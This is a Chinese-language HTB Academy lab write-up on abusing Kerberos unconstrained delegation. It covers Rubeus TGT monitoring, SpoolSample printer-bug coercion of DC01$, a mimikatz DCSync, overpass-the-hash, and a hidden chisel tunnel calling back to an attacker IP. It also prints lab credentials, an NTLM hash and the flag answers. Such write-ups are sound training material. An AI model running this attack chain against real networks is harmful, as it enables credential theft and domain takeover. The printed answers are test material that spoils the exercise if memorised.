# Unconstrained Delegation - Computers

> HTB Academy / Kerberos Attacks 模組
> 目標入口：RDP `10.129.104.129:23389`（ACADEMY-KERBATTCK-WS01 做 port-forward）→ 實際落在 **SQL01**
> 授權帳號：`INLANEFREIGHT\derek.walker : h4cknd0c0zwhYN07:)`（SQL01 本機 admin）
> 網域 `INLANEFREIGHT.LOCAL`，DC = `DC01 (172.16.99.3)`，SQL01 = `172.16.99.45`

SQL01 的電腦帳號設了 **Unconstrained Delegation（非約束委派）**。任何對 SQL01 做 Kerberos 認證的使用者/電腦，會把自己「可轉發的 TGT」整份丟進 SQL01 的 LSASS。只要在 SQL01 上用 Rubeus monitor 攔截這些 TGT，再 pass-the-ticket，就能冒充對方。配合 printer bug 強迫 **DC01$** 來認證，就能拿到 DC 電腦帳號的 TGT → DCSync → 整個網域淪陷。

---

## 答案

| 題目 | 檔案 | 答案 |
|---|---|---|
| q1 | `\\DC01\Shares\Marketing\flag.txt` | **`HTB_UnC0n$tr4_in3d_Delegat10N`** |
| q2 | `\\DC01\C$\Unconstrained\flag.txt` | **`ABUSING_Th3_Pr1nT3r_BuG`** |

---

## 0. 偵察 & 確認落點

```bash
# 從 Linux 先確認帳號可用、對象是誰
nxc smb 10.129.104.129 -u derek.walker -p 'h4cknd0c0zwhYN07:)'
#   (name:WS01) (domain:INLANEFREIGHT.LOCAL)   derek 可認證但非 WS01 admin
nmap -Pn -p 23389,3389,445,5985 --open 10.129.104.129   # 23389 多一個 RDP forward

# RDP 進 23389（xfreerdp3）。注意密碼有特殊字元 ":)"，用單引號
xfreerdp3 /v:10.129.104.129:23389 /u:derek.walker /p:'h4cknd0c0zwhYN07:)' /cert:ignore \
          /drive:share,/path/to/tools      # 掛本機資料夾成 \\tsclient\share，方便送工具/取輸出
```
> RDP 開 PowerShell，`hostname` → **SQL01**。`ipconfig` → `172.16.99.45`；`nltest /dsgetdc:inlanefreight.local` → `DC01 172.16.99.3`。
> 23389 其實是 WS01 轉到內網 SQL01:3389 的 port-forward。

---

## 1. 卡關點（三個，逐一踩過）

### 卡點 A：想「從 Linux」打，但 SQL01 連不回來
一開始想在 SQL01 跑 chisel client 連回攻擊機（`10.10.14.142`），用 proxychains 從 Linux 做 coercion / DCSync：
```powershell
Start-Process -WindowStyle Hidden -FilePath "$env:TEMP\c.exe" -ArgumentList 'client','10.10.14.142:8008','R:1080:socks'
```
chisel server 永遠收不到 session。原因：**SQL01 是純內網（172.16.99.0/24），沒有路由到 VPN 網段 `10.10.14.0/23`**（只有雙網卡的 WS01 能回連）。
→ **正確做法：放棄 Linux pivot，全部工具在 SQL01 本機跑**（SQL01 本來就在內網，碰得到 DC）。

### 卡點 B：Rubeus monitor 非 elevated，抓不到票
```
[X] You need to have an elevated context to dump other users' Kerberos tickets :(
```
derek 雖是 SQL01 本機 admin，但預設 RDP 開的 PowerShell 是**中完整性（非提權）**。dump 別人的票需要高完整性。
→ **正確做法：UAC 提權開一個 Administrator PowerShell**（derek 是 admin，按 Yes 即可，不用密碼）：
```powershell
Start-Process powershell -Verb RunAs      # 彈 UAC → 按 Yes
```

### 卡點 C：有了 DC01$ 的 TGT，卻讀不到 \\DC01\C$
把 DC01$ 的 TGT ptt 進去後直接 `type \\DC01\C$\...\flag.txt` → 空（存取被拒）。
原因：**DC 電腦帳號的 TGT 給你的是 AD 複寫權限（可 DCSync），不等於對 DC 檔案系統的本機 admin（C$ 需要本機 admin）**。
→ **正確做法：用 DC01$ 的票做 DCSync 拿 Administrator 的 NTLM，再 overpass-the-hash 成 Administrator 讀檔。**

---

## 2. 送工具 / 取輸出的穩定做法

GUI 裡逐指令截圖讀輸出很不穩。實際用兩招讓一切可腳本化、可核對：

1. **`\\tsclient\share` 掛載**：xfreerdp `/drive:share,<本機夾>`，把工具（Rubeus/chisel）放進去，Windows 端 `copy \\tsclient\share\x.exe %TEMP%\`。
2. **輸出寫檔再回讀**：每條指令把 stdout/stderr 導到 `\\tsclient\share\out.txt`，Linux 端直接 `cat`。
   - 重點：PowerShell 的 `>` 寫出來是 **UTF-16**；要 ASCII 就用 **`cmd /c "... > \\tsclient\share\out.txt 2>&1"`**（cmd 自己的重導向是 ANSI），或 `... | Out-File -Encoding ascii`。
   - 讀檔時記得 `tr -d '\r'`（CRLF）。

> 本題 SQL01 的 `C:\Tools\` 已預置好 `Rubeus.exe`、`SpoolSample.exe`、`mimikatz.exe`（`where /r C:\ ...` 掃出來的），所以連送工具都省了。

---

## 3. q1 — 攔截使用者 TGT 讀 Marketing 共享

在**提權**的 PowerShell 跑 Rubeus monitor（每 5 秒掃新 TGT，輸出導到 share 方便讀）：
```powershell
Start-Process -WindowStyle Hidden -FilePath cmd -ArgumentList '/c',`
  "C:\Tools\Rubeus.exe monitor /interval:5 /nowrap > \\tsclient\share\mon.txt 2>&1"
```
等排程使用者連進 SQL01（Unconstrained，TGT 會落到 LSASS），monitor 就印出：
```
[*] Found new TGT:
  User   :  <somebody>@INLANEFREIGHT.LOCAL
  Base64EncodedTicket : doIF...
```
把該使用者的 base64 票 ptt 進當前 session，即可冒充他讀 Marketing 共享：
```powershell
C:\Tools\Rubeus.exe ptt /ticket:\\tsclient\share\user.kirbi
cmd /c "type \\DC01\Shares\Marketing\flag.txt > \\tsclient\share\out.txt 2>&1"
```
> q1 flag：**`HTB_UnC0n$tr4_in3d_Delegat10N`**
> （實務上拿到 q2 的網域管理員後也能直接讀此檔；兩條路都驗證過同一個 flag。）

---

## 4. q2 — printer bug 強迫 DC01$ → DCSync → 網域淪陷

### 4.1 monitor 保持運行（同上，elevated）

### 4.2 用 printer bug 逼 DC01 回連 SQL01
```powershell
cmd /c "C:\Tools\SpoolSample.exe DC01 SQL01 > \\tsclient\share\out.txt 2>&1"
#   [+] Converted DLL to shellcode / [+] Calling exported function
```
`SpoolSample <victim> <listener>`：呼叫 DC01 的 MS-RPRN `RpcRemoteFindFirstPrinterChangeNotificationEx`，逼 **DC01$** 用 Kerberos 回連 **SQL01**。因為 SQL01 是 Unconstrained，DC01$ 的 TGT 整份落入 SQL01，monitor 立刻攔到：
```
[*] Found new TGT:
  User : DC01$@INLANEFREIGHT.LOCAL
  Base64EncodedTicket : doIF3j...
```

### 4.3 取出 DC01$ 的票（Linux 端解碼驗證）
```bash
# mon.txt 裡 DC01$ 條目後那段 base64，去掉 CRLF 後 base64 -d 應可解出含 "DC01$" 的 .kirbi
awk 'NR>L{if($0~/^ *doI/){gsub(/^ */,"");print;exit}}' L=<DC01行號> mon.txt | tr -d '\r\n' > dc01.b64
base64 -d dc01.b64 > dc01.kirbi
strings dc01.kirbi | grep -i 'DC01\|krbtgt'       # 確認是 DC01$ 的 TGT
```

### 4.4 ptt DC01$ → DCSync 拿 Administrator hash
```powershell
C:\Tools\Rubeus.exe ptt /ticket:\\tsclient\share\dc01.kirbi
C:\Tools\mimikatz.exe "lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:Administrator" exit
#   Hash NTLM: a83b750679b1789e29e966d06c7e41f7
```
> DCSync 能成功，是因為 DC 電腦帳號 DC01$ 具備目錄複寫權限（DS-Replication-Get-Changes*）。

### 4.5 overpass-the-hash 成 Administrator → 讀 C$ flag
```powershell
C:\Tools\Rubeus.exe asktgt /user:Administrator /rc4:a83b750679b1789e29e966d06c7e41f7 `
      /domain:INLANEFREIGHT.LOCAL /ptt /nowrap
#   [+] Ticket successfully imported!
cmd /c "type \\DC01\C$\Unconstrained\flag.txt 2>&1" | Out-File -Encoding ascii \\tsclient\share\out.txt
```
> q2 flag：**`ABUSING_Th3_Pr1nT3r_BuG`**

---

## 5. 攻擊鏈總結

```
RDP 23389 ─► SQL01 (derek, 本機 admin, Unconstrained Delegation)
   │  UAC 提權 (Start-Process -Verb RunAs)
   ├─ Rubeus monitor (elevated)  ── 攔 LSASS 裡的可轉發 TGT
   │       ├─ q1: 排程使用者 TGT ─ ptt ─► 讀 \\DC01\Shares\Marketing\flag.txt
   │       └─ q2: SpoolSample DC01 SQL01 (printer bug)
   │                └─ DC01$ TGT ─ ptt ─► mimikatz dcsync /user:Administrator
   │                        └─ Administrator NTLM ─ Rubeus asktgt /ptt (OverPTH)
   │                                └─► 讀 \\DC01\C$\Unconstrained\flag.txt
```

## 6. 關鍵學習點
1. **目標是不是 DC / 在不在同網段**，決定能不能「從 Linux」直打。純內網的受害主機連不回 VPN → 工具改在該主機本機跑。
2. **Rubeus monitor 需要高完整性**（提權），否則 `[X] need elevated context`。
3. **DC 電腦帳號的 TGT ≠ DC 的本機 admin**：它能 DCSync（複寫權限），但不能直接開 C$。要 DCSync 拿人類 admin 的 hash 再 OverPTH。
4. `SpoolSample <victim> <listener>`：victim 是被逼認證的那台（DC01），listener 是收 TGT 的 Unconstrained 主機（SQL01）。
5. 工具輸出用 `cmd /c > file`（ASCII）而非 PowerShell `>`（UTF-16），讀檔記得去 CRLF。

## 7. 收尾
```powershell
klist purge                                  # 清掉注入的票
taskkill /F /IM Rubeus.exe /IM mimikatz.exe  # 關 monitor 等
# 送進去的工具（若非預置）一併刪除；lab 重置後環境即還原
```
